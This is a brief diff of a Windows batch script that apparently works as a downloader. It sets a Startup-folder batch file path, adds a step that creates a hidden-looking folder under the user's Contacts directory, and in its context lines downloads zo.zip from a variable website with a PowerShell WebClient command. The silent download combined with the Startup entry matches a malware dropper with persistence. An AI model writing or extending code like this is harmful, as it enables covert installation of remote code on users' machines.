@@ -6,6 +6,9 @@ set "z=%TEMP%\zo.zip"
 set "d=%USERPROFILE%\Contacts\zo"
 set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 
+:: Create target directory if not exists
+if not exist "%d%" mkdir "%d%"
+
 :: Download zo.zip from the website
 powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%zo.zip','%z%')"
 
